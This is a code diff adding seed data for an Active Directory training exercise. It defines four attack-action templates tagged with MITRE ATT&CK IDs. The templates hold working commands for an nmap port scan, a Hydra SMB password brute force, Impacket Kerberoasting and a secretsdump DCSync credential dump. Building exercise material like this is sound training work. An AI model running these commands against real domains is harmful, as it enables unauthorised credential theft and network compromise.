@@ -1,0 +1,49 @@
+# Didactic example: ActionTemplate seed for AD exercise
+templates = [
+    ActionTemplate(
+        name="Network scan with nmap",
+        description="Host and service discovery on the target segment",
+        default_cmd="nmap -sV -sC -p 1-65535 {target}",
+        severity=1, complexity=1,
+        confidentiality=1, integrity=0, availability=0,
+        mitre_technique_id="T1046",
+        mitre_tactic="Discovery",
+        kill_chain_phase="Reconnaissance",
+        tags=["network", "discovery"]
+    ),
+    ActionTemplate(
+        name="SMB brute force with Hydra",
+        description="Dictionary attack against SMB service",
+        default_cmd="hydra -L /opt/wordlists/users.txt "
+                    "-P /opt/wordlists/passwords.txt smb://{target}",
+        severity=3, complexity=2,
+        confidentiality=2, integrity=1, availability=1,
+        mitre_technique_id="T1110.001",
+        mitre_tactic="Credential Access",
+        kill_chain_phase="Exploitation",
+        tags=["windows", "smb", "bruteforce"]
+    ),
+    ActionTemplate(
+        name="Kerberoasting with Impacket",
+        description="TGS ticket extraction for offline cracking",
+        default_cmd="impacket-GetUserSPNs -dc-ip {target} "
+                    "DOMAIN/user:password -request",
+        severity=4, complexity=3,
+        confidentiality=3, integrity=0, availability=0,
+        mitre_technique_id="T1558.003",
+        mitre_tactic="Credential Access",
+        kill_chain_phase="Exploitation",
+        tags=["windows", "ad", "kerberos"]
+    ),
+    ActionTemplate(
+        name="DCSync with secretsdump",
+        description="Domain controller credential replication",
+        default_cmd="impacket-secretsdump -just-dc {target}",
+        severity=5, complexity=4,
+        confidentiality=3, integrity=3, availability=1,
+        mitre_technique_id="T1003.006",
+        mitre_tactic="Credential Access",
+        kill_chain_phase="Actions on Objectives",
+        tags=["windows", "ad", "dcsync", "critical"]
+    ),
+]
